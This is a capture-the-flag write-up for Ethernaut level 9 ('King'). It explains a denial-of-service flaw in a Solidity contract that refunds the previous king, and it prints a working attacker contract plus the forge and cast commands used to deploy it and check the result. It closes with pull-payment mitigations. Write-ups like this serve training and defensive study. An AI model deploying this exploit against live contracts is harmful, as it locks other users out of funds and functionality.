# Ethernaut #9 — King

## Objective

Claim the throne by becoming the king, then prevent anyone else from taking it.

## Vulnerability: Denial of Service Through Failed ETH Refunds

The `King` contract allows anyone to become king by sending ETH greater than or equal to the current prize. When a new user claims the throne, the contract attempts to refund the previous king using `transfer()`.

The problem is that the refund must succeed for the transaction to complete. If the current king is a contract that rejects incoming ETH transfers, the refund fails and the entire transaction reverts.

By making a contract that becomes king but cannot receive ETH, an attacker can prevent anyone else from claiming the throne.

## Root Cause

The contract relies on an external ETH transfer succeeding before it can update the king and prize.

The developer assumes that the current king will always be able to receive ETH. However, a contract can reject ETH transfers, causing the refund to revert. Because the refund is part of the same transaction, the entire operation fails, preventing the king and prize from being updated.

The underlying issue is coupling the core state transition to a successful external payment.

## Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TakeThrone {
    address immutable king = 0x2d9085787FcFf3FA0F102D23D0fAA8b560609d05;

    constructor() payable {
        require(address(this).balance > 0.001 ether);

        (bool success, ) = payable(king).call{
            value: address(this).balance
        }("");

        require(success, "Transfer failed");
    }
}
```

The attack contract is intentionally minimal. It doesn't need a separate attack function because the entire attack happens in its constructor.

- The `payable` constructor allows ETH to be sent alongside deployment.
- The balance check ensures the contract has more than `0.001 ETH`.
- The low-level call forwards the contract's entire balance to the King contract.
- The contract has neither a payable `receive()` function nor a payable fallback function, so it rejects ordinary ETH transfers.

The last point is what makes the attack work. The attacker contract can send ETH to the King contract, but it cannot accept the refund when someone tries to outbid it.

## Exploit

### 1. Understand the target contract

The important part of the King contract is its `receive()` function:

```solidity
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
}
```

A new challenger must send at least the current prize. The contract then refunds the previous king before updating the king and prize.

If the refund fails, execution reverts and the state changes never happen.

### 2. Deploy the attacker contract with ETH

The constructor must be payable so it can receive ETH during deployment.

I used Foundry's `forge create` with `--value` to fund the constructor:

```bash
forge create src/TakeThrone.sol:TakeThrone \
  --constructor-args \
  --value 0.002ether \
  --rpc-url $SEPOLIA_RPC_URL \
  --private-key $PRIVATE_KEY \
  --broadcast
```

This sends `0.002 ETH` alongside the deployment transaction. The constructor forwards that ETH to the King contract, making the attacker contract the new king.

The command above is an example deployment command; the actual target address and funding should match the instance being attacked.

### 3. Read the current king

I initially tried calling `king()`, but the actual getter in this instance was `_king()`.

Using `cast call`:

```bash
cast call <KING_CONTRACT_ADDRESS> \
  "_king()(address)" \
  --rpc-url $SEPOLIA_RPC_URL
```

This returned the attacker contract's address, confirming that it had become king.

### 4. Read the prize

The prize is exposed through the public `prize` variable.

```bash
cast call <KING_CONTRACT_ADDRESS> \
  "prize()(uint256)" \
  --rpc-url $SEPOLIA_RPC_URL
```

The result was returned as a hexadecimal, ABI-encoded integer. I converted it to ETH using:

```bash
cast to-unit <VALUE_IN_WEI> ether
```

This made it easier to determine how much ETH a challenger would need to send.

### 5. Attempt to outbid the attacker contract

I tried sending a larger amount of ETH to the King contract using `cast send`.

```bash
cast send <KING_CONTRACT_ADDRESS> \
  --value <AMOUNT_GREATER_THAN_PRIZE> \
  --rpc-url http://127.0.0.1:8545 \
  --private-key <ANVIL_TEST_PRIVATE_KEY>
```

The local fork returned an execution revert during gas estimation.

The reason was the attempted refund to the attacker contract. Since `TakeThrone` has no payable `receive()` or fallback function, it cannot accept the transfer. The King contract's refund fails, reverting the entire outbid transaction.

No transaction was broadcast when gas estimation failed.

### 6. Verify the state and complete the level

I checked `_king()` and `prize()` again to verify the result. The failed outbid did not change the state.

After reproducing the behavior locally, I deployed the attack against my Ethernaut instance on Sepolia and submitted the level successfully.

## Impact

A malicious user can permanently prevent anyone else from becoming king by making a contract that rejects ETH transfers the current king.

The vulnerability causes a denial of service: the contract's main functionality becomes unavailable to other users because every outbid attempt triggers a refund that cannot succeed.

## Key Takeaways

- External calls can revert an entire transaction.
- Contracts can reject ETH transfers by omitting a payable `receive()` and payable fallback function.
- A contract can send ETH to another contract without necessarily being able to receive ETH itself.
- `payable` constructors can receive ETH during deployment.
- `cast call` is useful for inspecting contract state, while `cast send` submits transactions.
- Failed transactions revert state changes made during execution.
- The vulnerability is not simply that a transfer fails; it is that a critical protocol operation depends on that transfer succeeding.

## Mitigation

- Avoid coupling critical state transitions to successful ETH refunds.
- Use a pull-payment pattern: update the king and prize, record the previous king's refund as a pending withdrawal, and allow the recipient to withdraw separately.
- Keep failed withdrawals from blocking unrelated protocol functionality.
- Carefully handle external calls and apply the checks-effects-interactions pattern where appropriate.

## Conclusion

The King level demonstrates how a seemingly reasonable ETH refund can create a denial-of-service vulnerability.

The attack required no complex logic or privileged access. A minimal contract that becomes king and rejects incoming ETH was enough to prevent future challengers from taking the throne.

The key lesson is to treat external calls as potential failure points and avoid making essential state transitions depend on their success.
